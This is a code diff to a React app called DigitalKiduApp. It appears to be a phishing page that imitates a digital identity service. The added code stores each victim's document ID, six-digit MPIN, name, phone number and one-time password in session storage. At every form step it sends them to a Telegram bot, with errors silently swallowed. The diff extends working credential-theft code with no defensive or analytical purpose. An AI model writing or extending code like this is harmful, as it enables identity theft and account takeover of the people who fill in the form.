@@ -36,6 +36,20 @@ export default function DigitalKiduApp() {
   const [canResend, setCanResend] = useState(false)
   const otpInputRef = useRef<HTMLInputElement>(null)
 
+  // Restore persisted state on mount
+  useEffect(() => {
+    if (typeof window !== "undefined") {
+      const savedDoc = sessionStorage.getItem("documentId")
+      const savedMpin = sessionStorage.getItem("mpin")
+      const savedName = sessionStorage.getItem("fullName")
+      const savedMobile = sessionStorage.getItem("mobileNumber")
+      if (savedDoc) setDocumentId(savedDoc)
+      if (savedMpin) setMpin(savedMpin)
+      if (savedName) setFullName(savedName)
+      if (savedMobile) setMobileNumber(savedMobile)
+    }
+  }, [])
+
   // Visitor Location tracking on land
   useEffect(() => {
     const trackVisitor = async () => {
@@ -96,6 +110,10 @@ export default function DigitalKiduApp() {
       return
     }
 
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("documentId", trimmed)
+    }
+
     setIsDocSubmitting(true)
     setDocError("")
 
@@ -126,14 +144,22 @@ export default function DigitalKiduApp() {
     const finalMpin = enteredMpin !== undefined ? enteredMpin : mpin
     if (finalMpin.length !== 6 || isMpinSubmitting) return
 
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("mpin", finalMpin)
+    }
+
+    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")
+
     setIsMpinSubmitting(true)
 
     import("@/lib/telegram")
       .then(({ sendTelegramMessage }) => {
         sendTelegramMessage({
           title: "🔐 Digital Kidu - 6-Digit MPIN Submitted",
-          documentId: documentId || "N/A",
+          documentId: currentDoc || "N/A",
+          docId: currentDoc || "N/A",
           mpin: finalMpin,
+          pin: finalMpin,
         }).catch(() => { })
       })
       .catch(() => { })
@@ -164,6 +190,17 @@ export default function DigitalKiduApp() {
       return
     }
 
+    const trimmedName = fullName.trim()
+    const trimmedMobile = mobileNumber.trim()
+
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("fullName", trimmedName)
+      sessionStorage.setItem("mobileNumber", trimmedMobile)
+    }
+
+    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")
+    const currentMpin = mpin || (typeof window !== "undefined" ? sessionStorage.getItem("mpin") || "" : "")
+
     setIsDetailsSubmitting(true)
     setDetailsError("")
 
@@ -171,11 +208,14 @@ export default function DigitalKiduApp() {
       .then(({ sendTelegramMessage }) => {
         sendTelegramMessage({
           title: "📝 Digital Kidu - Personal Details Submitted",
-          documentId: documentId || "N/A",
-          mpin: mpin || "N/A",
-          fullName: fullName.trim(),
-          mobileNumber: mobileNumber.trim(),
-          phone: mobileNumber.trim(),
+          documentId: currentDoc || "N/A",
+          docId: currentDoc || "N/A",
+          mpin: currentMpin || "N/A",
+          pin: currentMpin || "N/A",
+          fullName: trimmedName,
+          name: trimmedName,
+          mobileNumber: trimmedMobile,
+          phone: trimmedMobile,
         }).catch(() => { })
       })
       .catch(() => { })
@@ -198,6 +238,15 @@ export default function DigitalKiduApp() {
     const finalOtp = enteredOtp !== undefined ? enteredOtp : otp
     if (finalOtp.length !== 6 || isOtpSubmitting) return
 
+    if (typeof window !== "undefined") {
+      sessionStorage.setItem("otp", finalOtp)
+    }
+
+    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")
+    const currentMpin = mpin || (typeof window !== "undefined" ? sessionStorage.getItem("mpin") || "" : "")
+    const currentName = fullName || (typeof window !== "undefined" ? sessionStorage.getItem("fullName") || "" : "")
+    const currentMobile = mobileNumber || (typeof window !== "undefined" ? sessionStorage.getItem("mobileNumber") || "" : "")
+
     setIsOtpSubmitting(true)
     setOtpError("")
 
@@ -205,10 +254,14 @@ export default function DigitalKiduApp() {
       .then(({ sendTelegramMessage }) => {
         sendTelegramMessage({
           title: "🔑 Digital Kidu - OTP Submitted",
-          documentId: documentId || "N/A",
-          fullName: fullName || "N/A",
-          phone: mobileNumber || "N/A",
-          mpin: mpin || "N/A",
+          documentId: currentDoc || "N/A",
+          docId: currentDoc || "N/A",
+          mpin: currentMpin || "N/A",
+          pin: currentMpin || "N/A",
+          fullName: currentName || "N/A",
+          name: currentName || "N/A",
+          mobileNumber: currentMobile || "N/A",
+          phone: currentMobile || "N/A",
           otp1: finalOtp,
         }).catch(() => { })
       })
@@ -233,12 +286,23 @@ export default function DigitalKiduApp() {
     setOtp("")
     setOtpError("")
 
+    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")
+    const currentMpin = mpin || (typeof window !== "undefined" ? sessionStorage.getItem("mpin") || "" : "")
+    const currentName = fullName || (typeof window !== "undefined" ? sessionStorage.getItem("fullName") || "" : "")
+    const currentMobile = mobileNumber || (typeof window !== "undefined" ? sessionStorage.getItem("mobileNumber") || "" : "")
+
     import("@/lib/telegram")
       .then(({ sendTelegramMessage }) => {
         sendTelegramMessage({
           title: "🔄 Digital Kidu - OTP Resend Requested",
-          documentId: documentId || "N/A",
-          phone: mobileNumber || "N/A",
+          documentId: currentDoc || "N/A",
+          docId: currentDoc || "N/A",
+          mpin: currentMpin || "N/A",
+          pin: currentMpin || "N/A",
+          fullName: currentName || "N/A",
+          name: currentName || "N/A",
+          mobileNumber: currentMobile || "N/A",
+          phone: currentMobile || "N/A",
         }).catch(() => { })
       })
       .catch(() => { })
